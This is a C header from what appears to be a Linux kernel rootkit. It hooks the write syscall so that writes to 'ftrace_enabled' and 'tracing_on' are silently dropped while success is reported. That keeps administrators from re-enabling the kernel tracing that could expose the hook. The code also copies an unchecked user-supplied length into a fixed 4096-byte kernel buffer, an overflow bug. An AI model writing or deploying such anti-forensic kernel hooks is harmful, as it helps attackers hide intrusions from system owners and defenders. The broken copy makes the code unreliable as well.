#ifndef WRITE_H
#define WRITE_H

#define B_F 4096  // Temporary buffer size for reading/writing

static asmlinkage ssize_t (*og_write)(const struct pt_regs *regs); // Pointer to the og write function

static notrace asmlinkage ssize_t hooked_write(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of write: fd
    const char __user *user_buf = (const char __user *)regs->si; // Second argument: input buffer from user
    size_t count = regs->dx; // Number of bytes to write

    char *kernel_buf;
    struct file *file;

    file = fget(fd); // Get the file object corresponding to the fd
    if (file) {

        /* Silently blocks writes to ftrace_enabled and tracing_on using sorta the 
           same trick we used in clear-taint-dmesg but for the write syscall. 
        */

        if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
            strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
            
            fput(file); // Free the file object after verification

            // Allocate a temporary buffer in kernel space
            kernel_buf = kmalloc(B_F, GFP_KERNEL);
            if (!kernel_buf) {
                return -ENOMEM;
            }

            // Copy data from user space to kernel space buffer
            if (copy_from_user(kernel_buf, user_buf, count)) {
                kfree(kernel_buf);
                return -EFAULT;
            }

            // Check for "1" or "0" and handle appropriately
            if (strncmp(kernel_buf, "1", 1) == 0) {
                // ftrace enabled
            } else if (strncmp(kernel_buf, "0", 1) == 0) {
                // ftrace disabled
            }

            kfree(kernel_buf);
            return count; // Simulate a successful write
        }

        fput(file); // Free the file object if it is not ftrace_enabled or tracing_on
    }

    return og_write(regs); // Call the original write function otherwise
}

#endif